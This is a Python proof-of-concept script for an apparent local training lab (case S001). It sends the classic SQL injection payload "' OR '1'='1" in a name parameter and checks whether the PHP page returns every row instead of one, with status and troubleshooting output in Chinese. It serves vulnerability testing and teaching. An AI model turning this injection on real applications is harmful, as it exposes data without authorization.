import urllib.parse
import urllib.request
import urllib.error

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
NORMAL_NAME = "Alice"
TEST_NAME = "' OR '1'='1"


def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-poc"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, url, body


def main():
    try:
        normal_status, normal_url, normal_body = fetch(NORMAL_NAME)
        test_status, test_url, test_body = fetch(TEST_NAME)
    except urllib.error.URLError as exc:
        print("请求失败，请检查本地入口是否可访问：", exc)
        return

    print("普通 URL：", normal_url)
    print("普通 HTTP 状态（仅参考，不作为成功条件）：", normal_status)
    print("普通正文：")
    print(normal_body)

    print("测试 URL：", test_url)
    print("测试 HTTP 状态（仅参考，不作为成功条件）：", test_status)
    print("测试正文：")
    print(test_body)

    normal_ok = ("Alice" in normal_body) and ("Bob" not in normal_body) and ("Carol" not in normal_body)
    test_ok = all(name in test_body for name in ("Alice", "Bob", "Carol"))

    print("普通预期：正文仅含 Alice，不含 Bob/Carol；实际：", "符合" if normal_ok else "不符合")
    print("测试预期：正文出现 Alice、Bob、Carol，记录数由 1 变 3；实际：", "符合" if test_ok else "不符合")

    if not normal_ok:
        print("失败检查：入口 URL、common/db_connect.php、lab_people 预置数据、name 参数编码。")
    if not test_ok:
        print("失败检查：测试输入是否原样进入查询、MariaDB 字符串处理、PHP 错误日志；不要以 HTTP 200 判定成功。")


if __name__ == "__main__":
    main()
